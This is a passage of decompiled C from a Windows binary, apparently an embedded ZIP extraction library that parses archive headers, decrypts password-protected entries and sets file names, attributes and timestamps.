  int iVar1;
  uint uVar2;
  undefined4 *puVar3;
  undefined4 local_60 [4];
  uint local_50;
  uint local_40;
  int local_28;
  uint local_24;
  uint local_20;
  uint local_1c;
  int local_18;
  int local_14;
  int local_10;
  int local_c;
  
  local_c = 0;
  if (param_1 == 0) {
    local_c = -0x66;
  }
  else {
    iVar1 = FUN_00406e76(this,*(int *)(param_1 + 0x14) + *(int *)(param_1 + 0xc));
    if (iVar1 == 0) {
      iVar1 = FUN_00406fab();
      if (iVar1 == 0) {
        if (local_10 != 0x2014b50) {
          local_c = -0x67;
        }
      }
      else {
        local_c = -1;
      }
    }
    else {
      local_c = -1;
    }
    iVar1 = FUN_00406f6f(*(undefined4 *)param_1);
    if (iVar1 != 0) {
      local_c = -1;
    }
    iVar1 = FUN_00406f6f(*(undefined4 *)param_1);
    if (iVar1 != 0) {
      local_c = -1;
    }
    iVar1 = FUN_00406f6f(*(undefined4 *)param_1);
    if (iVar1 != 0) {
      local_c = -1;
    }
    iVar1 = FUN_00406f6f(*(undefined4 *)param_1);
    if (iVar1 != 0) {
      local_c = -1;
    }
    iVar1 = FUN_00406fab();
    if (iVar1 != 0) {
      local_c = -1;
    }
    local_1c = local_50 >> 0x10 & 0x1f;
    local_14 = (local_50 >> 0x19) + 0x7bc;
    local_20 = local_50 >> 0xb & 0x1f;
    local_18 = (local_50 >> 0x15 & 0xf) - 1;
    local_24 = local_50 >> 5 & 0x3f;
    local_28 = (local_50 & 0x1f) * 2;
    iVar1 = FUN_00406fab();
    if (iVar1 != 0) {
      local_c = -1;
    }
    iVar1 = FUN_00406fab();
    if (iVar1 != 0) {
      local_c = -1;
    }
    iVar1 = FUN_00406fab();
    if (iVar1 != 0) {
      local_c = -1;
    }
    iVar1 = FUN_00406f6f(*(undefined4 *)param_1);
    if (iVar1 != 0) {
      local_c = -1;
    }
    iVar1 = FUN_00406f6f(*(undefined4 *)param_1);
    if (iVar1 != 0) {
      local_c = -1;
    }
    iVar1 = FUN_00406f6f(*(undefined4 *)param_1);
    if (iVar1 != 0) {
      local_c = -1;
    }
    iVar1 = FUN_00406f6f(*(undefined4 *)param_1);
    if (iVar1 != 0) {
      local_c = -1;
    }
    iVar1 = FUN_00406f6f(*(undefined4 *)param_1);
    if (iVar1 != 0) {
      local_c = -1;
    }
    iVar1 = FUN_00406fab();
    if (iVar1 != 0) {
      local_c = -1;
    }
    iVar1 = FUN_00406fab();
    if (iVar1 != 0) {
      local_c = -1;
    }
    if (local_c == 0) {
      if (param_4 != (void *)0x0) {
        uVar2 = param_5;
        if (local_40 < param_5) {
          *(undefined *)(local_40 + (int)param_4) = 0;
          uVar2 = local_40;
        }
        if (((local_40 != 0) && (param_5 != 0)) &&
           (uVar2 = FUN_00406ed5(param_4,uVar2,1), uVar2 != 1)) {
          return -1;
        }
      }
      if (param_2 != (undefined4 *)0x0) {
        puVar3 = local_60;
        for (iVar1 = 0x14; iVar1 != 0; iVar1 = iVar1 + -1) {
          *param_2 = *puVar3;
          puVar3 = puVar3 + 1;
          param_2 = param_2 + 1;
        }
      }
      if (param_3 != (int *)0x0) {
        *param_3 = param_1;
      }
    }
  }
  return local_c;
}



int __fastcall FUN_004074dd(void *param_1)

{
  int iVar1;
  int unaff_ESI;
  
  if (unaff_ESI == 0) {
    return -0x66;
  }
  *(undefined4 *)(unaff_ESI + 0x10) = 0;
  *(undefined4 *)(unaff_ESI + 0x14) = *(undefined4 *)(unaff_ESI + 0x24);
  iVar1 = FUN_004072ba(param_1,unaff_ESI,(undefined4 *)(unaff_ESI + 0x28),(int *)(unaff_ESI + 0x78),
                       (void *)0x0,0);
  *(uint *)(unaff_ESI + 0x18) = (uint)(iVar1 == 0);
  return iVar1;
}



int FUN_00407512(void)

{
  void *this;
  int unaff_ESI;
  int iVar1;
  
  if (unaff_ESI == 0) {
    iVar1 = -0x66;
  }
  else {
    if ((*(int *)(unaff_ESI + 0x18) != 0) &&
       (iVar1 = *(int *)(unaff_ESI + 0x10) + 1, iVar1 != *(int *)(unaff_ESI + 4))) {
      *(int *)(unaff_ESI + 0x10) = iVar1;
      this = (void *)(*(int *)(unaff_ESI + 0x50) + *(int *)(unaff_ESI + 0x4c) + 0x2e +
                     *(int *)(unaff_ESI + 0x48));
      *(int *)(unaff_ESI + 0x14) = *(int *)(unaff_ESI + 0x14) + (int)this;
      iVar1 = FUN_004072ba(this,unaff_ESI,(undefined4 *)(unaff_ESI + 0x28),(int *)(unaff_ESI + 0x78)
                           ,(void *)0x0,0);
      *(uint *)(unaff_ESI + 0x18) = (uint)(iVar1 == 0);
      return iVar1;
    }
    iVar1 = -100;
  }
  return iVar1;
}



int __cdecl FUN_00407563(int param_1,int *param_2,int *param_3,int **param_4)

{
  int iVar1;
  undefined4 uVar2;
  int iVar3;
  uint local_10;
  int local_c;
  int local_8;
  
  *param_2 = 0;
  iVar3 = *(int *)(param_1 + 0xc);
  iVar1 = *(int *)(param_1 + 0x78);
  *param_3 = 0;
  local_8 = 0;
  *param_4 = (int *)0x0;
  iVar3 = FUN_00406e76(param_4,iVar3 + iVar1);
  if (iVar3 == 0) {
    iVar3 = FUN_00406fab();
    if (iVar3 == 0) {
      if (local_10 != 0x4034b50) {
        local_8 = -0x67;
      }
    }
    else {
      local_8 = -1;
    }
    iVar3 = FUN_00406f6f(*(undefined4 *)param_1);
    if (iVar3 != 0) {
      local_8 = -1;
    }
    iVar3 = FUN_00406f6f(*(undefined4 *)param_1);
    if (iVar3 != 0) {
      local_8 = -1;
    }
    iVar3 = FUN_00406f6f(*(undefined4 *)param_1);
    if (iVar3 == 0) {
      if ((local_8 == 0) &&
         ((iVar3 = *(int *)(param_1 + 0x34), local_c != iVar3 || ((iVar3 != 0 && (iVar3 != 8)))))) {
        local_8 = -0x67;
      }
    }
    else {
      local_8 = -1;
    }
    iVar3 = FUN_00406fab();
    if (iVar3 != 0) {
      local_8 = -1;
    }
    iVar3 = FUN_00406fab();
    if (iVar3 == 0) {
      if (((local_8 == 0) && (local_c != *(int *)(param_1 + 0x3c))) && ((local_10 & 8) == 0)) {
        local_8 = -0x67;
      }
    }
    else {
      local_8 = -1;
    }
    iVar3 = FUN_00406fab();
    if (iVar3 == 0) {
      if (((local_8 == 0) && (local_c != *(int *)(param_1 + 0x40))) && ((local_10 & 8) == 0)) {
        local_8 = -0x67;
      }
    }
    else {
      local_8 = -1;
    }
    iVar3 = FUN_00406fab();
    if (iVar3 == 0) {
      if (((local_8 == 0) && (local_c != *(int *)(param_1 + 0x44))) && ((local_10 & 8) == 0)) {
        local_8 = -0x67;
      }
    }
    else {
      local_8 = -1;
    }
    iVar3 = FUN_00406f6f(*(undefined4 *)param_1);
    if (iVar3 == 0) {
      if ((local_8 == 0) && (local_10 != *(uint *)(param_1 + 0x48))) {
        local_8 = -0x67;
      }
    }
    else {
      local_8 = -1;
    }
    uVar2 = *(undefined4 *)param_1;
    *param_2 = *param_2 + local_10;
    iVar3 = FUN_00406f6f(uVar2);
    if (iVar3 != 0) {
      local_8 = -1;
    }
    *param_3 = *(int *)(param_1 + 0x78) + 0x1e + local_10;
    *param_2 = *param_2 + (int)param_2;
    *param_4 = param_2;
  }
  else {
    local_8 = -1;
  }
  return local_8;
}



undefined4 __cdecl FUN_00407726(char *param_1)

{
  undefined uVar1;
  int iVar2;
  void **_Memory;
  void *pvVar3;
  void **ppvVar4;
  void **extraout_ECX;
  void **unaff_EBX;
  undefined4 uVar5;
  int local_10;
  int *local_c;
  char *local_8;
  
  if ((unaff_EBX == (void **)0x0) || (unaff_EBX[6] == (void *)0x0)) {
    uVar5 = 0xffffff9a;
  }
  else {
    if (unaff_EBX[0x1f] != (void *)0x0) {
      FUN_00407aad();
    }
    iVar2 = FUN_00407563((int)unaff_EBX,&local_10,(int *)&local_8,&local_c);
    if (iVar2 == 0) {
      _Memory = (void **)_malloc(0x84);
      if (_Memory != (void **)0x0) {
        pvVar3 = _malloc(0x4000);
        _Memory[0x11] = local_8;
        *_Memory = pvVar3;
        _Memory[0x12] = local_c;
        _Memory[0x13] = (void *)0x0;
        if (pvVar3 != (void *)0x0) {
          _Memory[0x10] = (void *)0x0;
          pvVar3 = unaff_EBX[0xd];
          _Memory[0x15] = unaff_EBX[0xf];
          _Memory[0x14] = (void *)0x0;
          _Memory[0x19] = unaff_EBX[0xd];
          _Memory[0x18] = *unaff_EBX;
          _Memory[0x1a] = unaff_EBX[3];
          _Memory[6] = (void *)0x0;
          if (pvVar3 != (void *)0x0) {
            _Memory[9] = (void *)0x0;
            _Memory[10] = (void *)0x0;
            _Memory[0xb] = (void *)0x0;
            iVar2 = FUN_00406a68();
            if (iVar2 == 0) {
              _Memory[0x10] = (void *)0x1;
            }
          }
          _Memory[0x16] = unaff_EBX[0x10];
          _Memory[0x17] = unaff_EBX[0x11];
          *(byte *)(_Memory + 0x1b) = *(byte *)(unaff_EBX + 0xc) & 1;
          if (((uint)unaff_EBX[0xc] >> 3 & 1) == 0) {
            uVar1 = *(undefined *)((int)unaff_EBX + 0x3f);
          }
          else {
            uVar1 = *(undefined *)((int)unaff_EBX + 0x39);
          }
          *(undefined *)(_Memory + 0x20) = uVar1;
          _Memory[0x1f] = (void *)(-(uint)(*(char *)(_Memory + 0x1b) != '\0') & 0xc);
          ppvVar4 = _Memory + 0x1c;
          *ppvVar4 = (void *)0x12345678;
          _Memory[0x1d] = (void *)0x23456789;
          _Memory[0x1e] = (void *)0x34567890;
          local_8 = param_1;
          if (param_1 != (char *)0x0) {
            do {
              if (*local_8 == '\0') break;
              FUN_00406860((uint *)ppvVar4,*local_8);
              local_8 = local_8 + 1;
              ppvVar4 = extraout_ECX;
            } while (local_8 != (char *)0x0);
          }
          _Memory[0xf] = (void *)((int)unaff_EBX[0x1e] + local_10 + 0x1e);
          _Memory[2] = (void *)0x0;
          unaff_EBX[0x1f] = _Memory;
          return 0;
        }
        _free(_Memory);
      }
      uVar5 = 0xffffff98;
    }
    else {
      uVar5 = 0xffffff99;
    }
  }
  return uVar5;
}



int __thiscall FUN_0040787b(void *this,void *param_1,undefined *param_2)

{
  char cVar1;
  void **ppvVar2;
  byte *pbVar3;
  int in_EAX;
  int iVar4;
  uint uVar5;
  void *pvVar6;
  void *pvVar7;
  void **ppvVar8;
  void **extraout_ECX;
  void *extraout_ECX_00;
  void *extraout_ECX_01;
  byte bVar9;
  void *local_14;
  void *local_10;
  int local_c;
  int local_8;
  
  local_c = 0;
  local_8 = 0;
  if (param_2 != (undefined *)0x0) {
    *param_2 = 0;
  }
  if ((in_EAX == 0) || (ppvVar2 = *(void ***)(in_EAX + 0x7c), ppvVar2 == (void **)0x0)) {
    local_8 = -0x66;
  }
  else if (*ppvVar2 == (void *)0x0) {
    local_8 = -100;
  }
  else if (this == (void *)0x0) {
LAB_004078b5:
    local_8 = 0;
  }
  else {
    ppvVar2[4] = param_1;
    ppvVar2[5] = this;
    if (ppvVar2[0x17] < this) {
      ppvVar2[5] = ppvVar2[0x17];
    }
    if (ppvVar2[5] != (void *)0x0) {
      do {
        if ((ppvVar2[2] == (void *)0x0) && (pvVar7 = ppvVar2[0x16], pvVar7 != (void *)0x0)) {
          local_14 = (void *)0x4000;
          if ((pvVar7 < (void *)0x4000) && (local_14 = pvVar7, pvVar7 == (void *)0x0)) {
            if (param_2 != (undefined *)0x0) {
              *param_2 = 1;
            }
            goto LAB_004078b5;
          }
          iVar4 = FUN_00406e76(this,(int)ppvVar2[0x1a] + (int)ppvVar2[0xf]);
          if ((iVar4 != 0) || (uVar5 = FUN_00406ed5(*ppvVar2,(uint)local_14,1), uVar5 != 1)) {
            return -1;
          }
          ppvVar2[0xf] = (void *)((int)ppvVar2[0xf] + (int)local_14);
          ppvVar2[0x16] = (void *)((int)ppvVar2[0x16] - (int)local_14);
          pvVar7 = *ppvVar2;
          ppvVar2[1] = pvVar7;
          ppvVar2[2] = local_14;
          if ((*(char *)(ppvVar2 + 0x1b) != '\0') &&
             (local_10 = (void *)0x0, local_14 != (void *)0x0)) {
            ppvVar8 = ppvVar2 + 0x1c;
            do {
              uVar5 = (uint)ppvVar8[2] & 0xfffd | 2;
              bVar9 = (byte)((uVar5 ^ 1) * uVar5 >> 8) ^ *(byte *)((int)local_10 + (int)pvVar7);
              FUN_00406860((uint *)ppvVar8,bVar9);
              *(byte *)((int)local_10 + (int)pvVar7) = bVar9;
              local_10 = (void *)((int)local_10 + 1);
              ppvVar8 = extraout_ECX;
            } while (local_10 < local_14);
          }
        }
        pvVar7 = ppvVar2[2];
        pvVar6 = ppvVar2[0x1f];
        if (pvVar7 < ppvVar2[0x1f]) {
          pvVar6 = pvVar7;
        }
        if (pvVar6 != (void *)0x0) {
          cVar1 = *(char *)((int)(void *)((int)ppvVar2[1] + (int)pvVar6) + -1);
          ppvVar2[0x17] = (void *)((int)ppvVar2[0x17] - (int)pvVar6);
          ppvVar8 = ppvVar2 + 0x1f;
          *ppvVar8 = (void *)((int)*ppvVar8 - (int)pvVar6);
          ppvVar2[2] = (void *)((int)pvVar7 - (int)pvVar6);
          ppvVar2[1] = (void *)((int)ppvVar2[1] + (int)pvVar6);
          if ((*ppvVar8 == (void *)0x0) && (cVar1 != *(char *)(ppvVar2 + 0x20))) {
            return -0x6a;
          }
        }
        if (ppvVar2[0x19] == (void *)0x0) {
          pvVar7 = ppvVar2[2];
          if (ppvVar2[5] < ppvVar2[2]) {
            pvVar7 = ppvVar2[5];
          }
          pvVar6 = (void *)0x0;
          if (pvVar7 != (void *)0x0) {
            do {
              *(undefined *)((int)pvVar6 + (int)ppvVar2[4]) =
                   *(undefined *)((int)pvVar6 + (int)ppvVar2[1]);
              pvVar6 = (void *)((int)pvVar6 + 1);
            } while (pvVar6 < pvVar7);
          }
          pbVar3 = (byte *)ppvVar2[4];
          pvVar6 = (void *)FUN_00406785(pbVar3,(uint)pvVar7);
          ppvVar2[0x17] = (void *)((int)ppvVar2[0x17] - (int)pvVar7);
          ppvVar2[2] = (void *)((int)ppvVar2[2] - (int)pvVar7);
          ppvVar2[5] = (void *)((int)ppvVar2[5] - (int)pvVar7);
          ppvVar2[1] = (void *)((int)ppvVar2[1] + (int)pvVar7);
          ppvVar2[6] = (void *)((int)ppvVar2[6] + (int)pvVar7);
          local_8 = local_8 + (int)pvVar7;
          ppvVar2[0x14] = pvVar6;
          ppvVar2[4] = pbVar3 + (int)pvVar7;
          this = extraout_ECX_00;
          if ((ppvVar2[0x17] == (void *)0x0) && (param_2 != (undefined *)0x0)) {
            *param_2 = 1;
          }
        }
        else {
          pbVar3 = (byte *)ppvVar2[4];
          pvVar7 = ppvVar2[6];
          local_c = FUN_00406b05();
          uVar5 = (int)ppvVar2[6] - (int)pvVar7;
          pvVar7 = (void *)FUN_00406785(pbVar3,uVar5);
          ppvVar2[0x17] = (void *)((int)ppvVar2[0x17] - uVar5);
          local_8 = local_8 + uVar5;
          ppvVar2[0x14] = pvVar7;
          if ((local_c == 1) || (ppvVar2[0x17] == (void *)0x0)) {
            if (param_2 == (undefined *)0x0) {
              return local_8;
            }
            *param_2 = 1;
            return local_8;
          }
          this = extraout_ECX_01;
          if (local_c != 0) {
            return local_c;
          }
        }
      } while (ppvVar2[5] != (void *)0x0);
      if (local_c != 0) {
        return local_c;
      }
    }
  }
  return local_8;
}



undefined4 FUN_00407aad(void)

{
  void **_Memory;
  undefined4 uVar1;
  int unaff_EDI;
  
  uVar1 = 0;
  if (unaff_EDI == 0) {
    uVar1 = 0xffffff9a;
  }
  else {
    _Memory = *(void ***)(unaff_EDI + 0x7c);
    if (_Memory == (void **)0x0) {
      uVar1 = 0xffffff9a;
    }
    else {
      if ((_Memory[0x17] == (void *)0x0) && (_Memory[0x14] != _Memory[0x15])) {
        uVar1 = 0xffffff97;
      }
      if (*_Memory != (void *)0x0) {
        _free(*_Memory);
        *_Memory = (void *)0x0;
      }
      *_Memory = (void *)0x0;
      if (_Memory[0x10] != (void *)0x0) {
        FUN_00406a10();
      }
      _Memory[0x10] = (void *)0x0;
      _free(_Memory);
      *(undefined4 *)(unaff_EDI + 0x7c) = 0;
    }
  }
  return uVar1;
}



longlong FUN_00407b0a(void)

{
  uint in_EAX;
  longlong lVar1;
  
  lVar1 = __allmul(in_EAX + 0xb6109100,((int)in_EAX >> 0x1f) + 2 + (uint)(0x49ef6eff < in_EAX),
                   10000000,0);
  return lVar1;
}



_FILETIME __fastcall FUN_00407b27(uint param_1)

{
  uint in_EAX;
  SYSTEMTIME local_1c;
  _FILETIME local_c;
  
  local_1c.wYear = ((ushort)param_1 >> 9) + 0x7bc;
  local_1c.wDay = (ushort)param_1 & 0x1f;
  local_1c.wHour = (ushort)in_EAX >> 0xb;
  local_1c.wSecond = ((ushort)in_EAX & 0x1f) * 2;
  local_1c.wMilliseconds = 0;
  local_1c.wMonth = (ushort)(param_1 >> 5) & 0xf;
  local_1c.wMinute = (ushort)(in_EAX >> 5) & 0x3f;
  SystemTimeToFileTime(&local_1c,&local_c);
  return local_c;
}



void FUN_00407b91(void)

{
  size_t sVar1;
  char *_Dest;
  undefined4 *unaff_ESI;
  
  unaff_ESI[1] = 0xffffffff;
  unaff_ESI[0x8e] = 0xffffffff;
  *unaff_ESI = 0;
  unaff_ESI[0x8f] = 0;
  unaff_ESI[0x90] = 0;
  sVar1 = _strlen(&DAT_0041ddd4);
  _Dest = (char *)operator_new(sVar1 + 1);
  unaff_ESI[0x8f] = _Dest;
  _strcpy(_Dest,&DAT_0041ddd4);
  return;
}



int FUN_00407bd3(undefined4 param_1,void *param_2)

{
  int *lpBuffer;
  short sVar1;
  int iVar2;
  char *pcVar3;
  char **ppcVar4;
  int *unaff_ESI;
  
  if ((*unaff_ESI == 0) && (unaff_ESI[1] == -1)) {
    lpBuffer = unaff_ESI + 0x91;
    GetCurrentDirectoryW(0x104,(LPWSTR)lpBuffer);
    iVar2 = FUN_00409dc5((short *)lpBuffer);
    sVar1 = *(short *)((int)unaff_ESI + iVar2 * 2 + 0x242);
    if ((sVar1 != 0x5c) && (sVar1 != 0x2f)) {
      _wcscat((wchar_t *)lpBuffer,(wchar_t *)&DAT_0041dc88);
    }
    pcVar3 = (char *)operator_new(0x20);
    *(undefined4 *)(pcVar3 + 0x14) = param_1;
    *pcVar3 = '\0';
    pcVar3[1] = '\x01';
    pcVar3[0x10] = '\0';
    *(void **)(pcVar3 + 0x18) = param_2;
    *(undefined4 *)(pcVar3 + 0x1c) = 0;
    *(undefined4 *)(pcVar3 + 0xc) = 0;
    ppcVar4 = FUN_0040714e(param_2,pcVar3);
    *unaff_ESI = (int)ppcVar4;
    iVar2 = (-(uint)(ppcVar4 != (char **)0x0) & 0xfffffe00) + 0x200;
  }
  else {
    iVar2 = 0x1000000;
  }
  return iVar2;
}



void __thiscall FUN_00407c65(void *this,void *param_1)

{
  wchar_t wVar1;
  void **ppvVar2;
  byte bVar3;
  int iVar4;
  void *pvVar5;
  int *piVar6;
  wchar_t *pwVar7;
  int iVar8;
  byte bVar9;
  undefined4 extraout_ECX;
  byte bVar10;
  undefined4 *unaff_EBX;
  wchar_t *_Str;
  longlong lVar11;
  uint local_398 [4];
  uint local_388;
  undefined4 local_380;
  undefined4 local_37c;
  uint local_364;
  _FILETIME local_344;
  _FILETIME local_33c;
  uint local_334;
  int *local_330;
  undefined4 local_32c;
  void **local_328;
  byte local_322;
  byte local_321;
  WCHAR local_320 [260];
  CHAR local_118 [268];
  uint local_c;
  
  local_c = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_328 = (void **)this;
                    // WARNING: Load size is inaccurate
  if ((-2 < (int)param_1) && ((int)param_1 < *(int *)(*this + 4))) {
    if (*(int *)((int)this + 4) != -1) {
      FUN_00407aad();
    }
    *(undefined4 *)((int)this + 4) = 0xffffffff;
    if (param_1 == *(void **)((int)this + 0x238)) {
      if (param_1 != (void *)0xffffffff) {
        _memcpy(unaff_EBX,(void *)((int)this + 8),0x230);
        goto LAB_0040814c;
      }
    }
    else if (param_1 != (void *)0xffffffff) {
                    // WARNING: Load size is inaccurate
      if ((int)param_1 < *(int *)((int)*this + 0x10)) {
        FUN_004074dd(*this);
        this = local_328;
      }
                    // WARNING: Load size is inaccurate
      iVar4 = *(int *)((int)*this + 0x10);
      pvVar5 = *this;
      while (iVar4 < (int)param_1) {
        FUN_00407512();
        pvVar5 = param_1;
        this = local_328;
        iVar4 = *(int *)((int)*local_328 + 0x10);
      }
                    // WARNING: Load size is inaccurate
      FUN_004072ba(pvVar5,(int)*this,local_398,(int *)0x0,local_118,0x104);
                    // WARNING: Load size is inaccurate
      iVar4 = FUN_00407563((int)*this,(int *)&local_334,&local_32c,&local_330);
      if (iVar4 == 0) {
        iVar4 = FUN_00406e76(extraout_ECX,local_32c);
        if (iVar4 == 0) {
          pvVar5 = operator_new((uint)local_330);
          piVar6 = (int *)FUN_00406ed5(pvVar5,1,(size_t)local_330);
          if (piVar6 == local_330) {
            *unaff_EBX = *(undefined4 *)((int)*local_328 + 0x10);
            MultiByteToWideChar(0xfde9,0,local_118,-1,local_320,0x104);
            _Str = local_320;
            while( true ) {
              while( true ) {
                for (; (wVar1 = *_Str, wVar1 != L'\0' && (_Str[1] == L':')); _Str = _Str + 2) {
                }
                if ((wVar1 != L'\\') && (wVar1 != L'/')) break;
                _Str = _Str + 1;
              }
              pwVar7 = _wcsstr(_Str,u______0041ffc4);
              if ((pwVar7 == (wchar_t *)0x0) &&
                 (((pwVar7 = _wcsstr(_Str,u______0041ffd0), pwVar7 == (wchar_t *)0x0 &&
                   (pwVar7 = _wcsstr(_Str,u______0041ffdc), pwVar7 == (wchar_t *)0x0)) &&
                  (pwVar7 = _wcsstr(_Str,u______0041ffe8), pwVar7 == (wchar_t *)0x0)))) break;
              _Str = pwVar7 + 4;
            }
            _wcscpy((wchar_t *)(unaff_EBX + 1),_Str);
            bVar9 = ~(byte)(local_364 >> 0x17);
            local_398[0] = local_398[0] >> 8;
            bVar3 = (byte)(local_364 >> 0x1e);
            local_322 = 0;
            local_321 = 0;
            bVar10 = 1;
            if ((((local_398[0] == 0) || (local_398[0] == 7)) || (local_398[0] == 0xb)) ||
               (local_398[0] == 0xe)) {
              local_322 = (byte)(local_364 >> 1) & 1;
              local_321 = (byte)(local_364 >> 2) & 1;
              bVar9 = (byte)local_364;
              bVar3 = (byte)(local_364 >> 4);
              bVar10 = (byte)(local_364 >> 5) & 1;
            }
            unaff_EBX[0x83] = 0;
            if ((bVar3 & 1) != 0) {
              unaff_EBX[0x83] = 0x10;
            }
            if (bVar10 != 0) {
              unaff_EBX[0x83] = unaff_EBX[0x83] | 0x20;
            }
            if (local_322 != 0) {
              unaff_EBX[0x83] = unaff_EBX[0x83] | 2;
            }
            if ((bVar9 & 1) != 0) {
              unaff_EBX[0x83] = unaff_EBX[0x83] | 1;
            }
            if (local_321 != 0) {
              unaff_EBX[0x83] = unaff_EBX[0x83] | 4;
            }
            unaff_EBX[0x8a] = local_380;
            unaff_EBX[0x8b] = local_37c;
            local_33c = FUN_00407b27(local_388 >> 0x10);
            LocalFileTimeToFileTime(&local_33c,&local_344);
            iVar4 = 0;
            unaff_EBX[0x84] = local_344.dwLowDateTime;
            unaff_EBX[0x85] = local_344.dwHighDateTime;
            unaff_EBX[0x86] = local_344.dwLowDateTime;
            unaff_EBX[0x87] = local_344.dwHighDateTime;
            unaff_EBX[0x88] = local_344.dwLowDateTime;
            unaff_EBX[0x89] = local_344.dwHighDateTime;
            if ((int *)0x4 < local_330) {
              do {
                iVar8 = local_32c;
                local_334 = (uint)*(byte *)((int)pvVar5 + iVar4 + 2);
                local_32c._0_3_ =
                     (uint3)CONCAT11(*(undefined *)((int)pvVar5 + iVar4 + 1),
                                     *(undefined *)(iVar4 + (int)pvVar5));
                iVar8 = _strcmp((char *)&local_32c,&DAT_0041fff4);
                if (iVar8 == 0) {
                  bVar9 = *(byte *)(iVar4 + 4 + (int)pvVar5);
                  local_321 = bVar9 >> 1 & 1;
                  local_322 = bVar9 >> 2 & 1;
                  if ((bVar9 & 1) != 0) {
                    lVar11 = FUN_00407b0a();
                    *(longlong *)(unaff_EBX + 0x88) = lVar11;
                  }
                  if (local_321 != 0) {
                    lVar11 = FUN_00407b0a();
                    *(longlong *)(unaff_EBX + 0x84) = lVar11;
                  }
                  if (local_322 != 0) {
                    lVar11 = FUN_00407b0a();
                    *(longlong *)(unaff_EBX + 0x86) = lVar11;
                  }
                  break;
                }
                iVar4 = iVar4 + 4 + local_334;
              } while ((int *)(iVar4 + 4U) < local_330);
            }
            if (pvVar5 != (void *)0x0) {
              FUN_0040b579(pvVar5);
            }
            ppvVar2 = local_328;
            _memcpy(local_328 + 2,unaff_EBX,0x230);
            ppvVar2[0x8e] = param_1;
            goto LAB_0040814c;
          }
          FUN_0040b579(pvVar5);
        }
      }
      goto LAB_0040814c;
    }
                    // WARNING: Load size is inaccurate
    *unaff_EBX = *(undefined4 *)(*this + 4);
    *(undefined2 *)(unaff_EBX + 1) = 0;
    unaff_EBX[0x83] = 0;
    unaff_EBX[0x84] = 0;
    unaff_EBX[0x85] = 0;
    unaff_EBX[0x86] = 0;
    unaff_EBX[0x87] = 0;
    unaff_EBX[0x88] = 0;
    unaff_EBX[0x89] = 0;
    unaff_EBX[0x8a] = 0;
    unaff_EBX[0x8b] = 0;
  }
LAB_0040814c:
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



void __thiscall FUN_0040815c(void *this,void *param_1,void *param_2)

{
  int iVar1;
  void *extraout_ECX;
  void *pvVar2;
  char local_9;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  if (*(int *)((int)this + 4) != 0) {
    pvVar2 = this;
    if (*(int *)((int)this + 4) != -1) {
      FUN_00407aad();
      pvVar2 = extraout_ECX;
    }
                    // WARNING: Load size is inaccurate
    *(undefined4 *)((int)this + 4) = 0xffffffff;
    if (*(int *)(*this + 4) < 1) goto LAB_0040821f;
    if (0 < *(int *)(*this + 0x10)) {
      FUN_004074dd(pvVar2);
    }
                    // WARNING: Load size is inaccurate
    while (*(int *)(*this + 0x10) < 0) {
      FUN_00407512();
    }
    FUN_00407726(*(char **)((int)this + 0x23c));
    *(undefined4 *)((int)this + 4) = 0;
  }
  iVar1 = FUN_0040787b(param_2,param_1,&local_9);
  if (iVar1 < 1) {
    FUN_00407aad();
    *(undefined4 *)((int)this + 4) = 0xffffffff;
  }
LAB_0040821f:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



undefined4 FUN_00408230(void)

{
  void *_Memory;
  void **unaff_EBX;
  
  if (unaff_EBX[1] != (void *)0xffffffff) {
    FUN_00407aad();
  }
  _Memory = *unaff_EBX;
  unaff_EBX[1] = (void *)0xffffffff;
  if (_Memory != (void *)0x0) {
    if (*(int *)((int)_Memory + 0x7c) != 0) {
      FUN_00407aad();
    }
    FUN_00406e55();
    _free(_Memory);
  }
  *unaff_EBX = (void *)0x0;
  return 0;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3

undefined4 * __cdecl FUN_0040826a(undefined4 param_1,void *param_2)

{
  void *pvVar1;
  int iVar2;
  undefined4 *puVar3;
  
  pvVar1 = operator_new(0x44c);
  if (pvVar1 == (void *)0x0) {
    iVar2 = 0;
  }
  else {
    iVar2 = FUN_00407b91();
  }
  DAT_00425338 = FUN_00407bd3(param_1,param_2);
  if (DAT_00425338 == 0) {
    puVar3 = (undefined4 *)operator_new(8);
    *puVar3 = 1;
    puVar3[1] = iVar2;
  }
  else {
    if (iVar2 != 0) {
      FUN_004082d7();
    }
    puVar3 = (undefined4 *)0x0;
  }
  return puVar3;
}



void FUN_004082d7(void)

{
  void *pvVar1;
  void *unaff_EDI;
  
  pvVar1 = *(void **)((int)unaff_EDI + 0x23c);
  if (pvVar1 != (void *)0x0) {
    FUN_0040b579(pvVar1);
  }
  *(void **)((int)unaff_EDI + 0x23c) = (void *)0x0;
  pvVar1 = *(void **)((int)unaff_EDI + 0x240);
  if (pvVar1 != (void *)0x0) {
    FUN_0040b579(pvVar1);
  }
  *(void **)((int)unaff_EDI + 0x240) = (void *)0x0;
  FUN_0040b579(unaff_EDI);
  return;
}



void __thiscall FUN_0040830f(void *this,void *param_1)

{
  int *in_EAX;
  
  *(undefined4 *)this = 0;
  *(undefined4 *)((int)this + 0x22c) = 0;
  *(undefined2 *)((int)this + 4) = 0;
  if (in_EAX == (int *)0x0) {
    DAT_00425338 = 0x10000;
  }
  else if (*in_EAX == 1) {
    DAT_00425338 = FUN_00407c65((void *)in_EAX[1],param_1);
  }
  else {
    DAT_00425338 = 0x80000;
  }
  return;
}



void __cdecl FUN_0040834f(void *param_1,void *param_2)

{
  int *in_EAX;
  
  if (in_EAX == (int *)0x0) {
    DAT_00425338 = 0x10000;
  }
  else if (*in_EAX == 1) {
    DAT_00425338 = FUN_0040815c((void *)in_EAX[1],param_1,param_2);
  }
  else {
    DAT_00425338 = 0x80000;
  }
  return;
}



undefined4 FUN_00408380(void)

{
  int iVar1;
  int *unaff_ESI;
  
  if (unaff_ESI == (int *)0x0) {
    DAT_00425338 = 0x10000;
  }
  else {
    if (*unaff_ESI == 1) {
      iVar1 = unaff_ESI[1];
      DAT_00425338 = FUN_00408230();
      if (iVar1 != 0) {
        FUN_004082d7();
      }
      FUN_0040b579(unaff_ESI);
      return DAT_00425338;
    }
    DAT_00425338 = 0x80000;
  }
  return DAT_00425338;
}



void FUN_004083c4(void)

{
  wchar_t *pwVar1;
  wchar_t *unaff_EDI;
  WCHAR local_210 [260];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
